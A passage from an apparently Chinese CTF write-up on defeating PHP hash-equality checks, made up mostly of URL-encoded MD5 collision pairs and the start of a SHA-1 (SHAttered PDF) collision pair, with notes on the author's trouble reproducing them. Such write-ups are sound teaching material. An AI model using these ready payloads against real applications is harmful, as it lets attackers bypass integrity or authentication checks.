href="https://segmentfault.com/a/1190000039189857">https://segmentfault.com/a/1190000039189857</a><br>这是生成工具。按照生成代码就行。<br>我一直以为是我的代码生成的有问题。询问<code>h3师傅</code>我是真没想到他一下就弄出来了。然后他将payload给了我，我复现但是还是不行。我换了很多php版本，最后还是不行。</p><p>然后最后经过<code>天上星</code>师傅的提醒，也许是抓包的问题（有时候抓包的时候不能直接改成POST）。可惜我没有在火狐里装<code>hackbar</code>，然后就又去装。</p><p>接着我又去询问<code>h3师傅</code>原因，他说他可以。可能使我的bp有问题。我实在不想去解决这个问题了。接下来直接写复现代码。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282059387.png" alt="QQ截图20220228205918"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">a=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>u<span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>ACZ<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>E<span class="hljs-meta">%</span><span class="hljs-number">94</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>B<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span><span class="hljs-number">29</span>Aq<span class="hljs-meta">%</span><span class="hljs-number">0</span>DoP<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span><span class="hljs-number">15</span>uB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>F<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">1</span><span class="hljs-meta">%</span>EAe<span class="hljs-meta">%</span><span class="hljs-number">0</span>D<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>EB<span class="hljs-meta">%</span>E<span class="hljs-number">7</span><span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>F<span class="hljs-meta">%</span>C<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>BI<span class="hljs-meta">%</span>D<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>B<span class="hljs-meta">%</span>A<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>BE-<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>J<span class="hljs-meta">%</span><span class="hljs-number">24</span>wh<span class="hljs-meta">%</span><span class="hljs-number">2</span>Bh<span class="hljs-number">6</span>C<span class="hljs-meta">%</span>EA<span class="hljs-meta">%</span>AFb<span class="hljs-meta">%</span>C<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>Ar<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>z<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>F<span class="hljs-number">66</span>y<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-number">5</span>p<span class="hljs-meta">%</span>F<span class="hljs-number">7</span>PH<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span>DDq<span class="hljs-meta">%</span><span class="hljs-number">9</span>F<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">2</span>Fw<span class="hljs-meta">%</span>B<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">99</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-number">4</span>C<span class="hljs-meta">%</span><span class="hljs-number">9</span>D<span class="hljs-meta">%</span>C<span class="hljs-number">7</span>P<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">3</span>P<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>FFr<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span>EEs<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span><span class="hljs-number">08</span>&amp;b=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>u<span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>ACZ<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>E<span class="hljs-meta">%</span><span class="hljs-number">94</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>B<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>A<span class="hljs-number">9</span>Aq<span class="hljs-meta">%</span><span class="hljs-number">0</span>DoP<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span><span class="hljs-number">15</span>uB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>F<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">1</span><span class="hljs-meta">%</span>EAe<span class="hljs-meta">%</span><span class="hljs-number">0</span>D<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>EB<span class="hljs-meta">%</span>E<span class="hljs-number">7</span><span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>FF<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>BI<span class="hljs-meta">%</span>D<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>B<span class="hljs-meta">%</span>A<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>BE-<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>J<span class="hljs-meta">%</span><span class="hljs-number">24</span>w<span class="hljs-meta">%</span>E<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>Bh<span class="hljs-number">6</span>C<span class="hljs-meta">%</span>EA<span class="hljs-meta">%</span>AFb<span class="hljs-meta">%</span>C<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>Ar<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>z<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>F<span class="hljs-number">6</span><span class="hljs-meta">%</span>B<span class="hljs-number">6</span>y<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-number">5</span>p<span class="hljs-meta">%</span>F<span class="hljs-number">7</span>PH<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span>DDq<span class="hljs-meta">%</span><span class="hljs-number">9</span>F<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">2</span>Fw<span class="hljs-meta">%</span>B<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">99</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>B<span class="hljs-number">4</span>B<span class="hljs-meta">%</span><span class="hljs-number">9</span>D<span class="hljs-meta">%</span>C<span class="hljs-number">7</span>P<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">3</span>P<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>FFr<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-symbol">ns3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span><span class="hljs-number">08</span><br></code></pre></td></tr></table></figure><p>这里同样附上(<code>h3师傅</code>的)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>&amp;b<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">array<span class="hljs-number">1</span><span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>&amp;array<span class="hljs-number">2</span><span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><h3 id="sha-1"><a href="#sha-1" class="headerlink" title="sha-1"></a>sha-1</h3><p>如果将这里的MD5换成sha1，就可以用下面代码。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">array<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span>&amp;array<span class="hljs-number">2</span><span class="hljs-operator">=</span><span 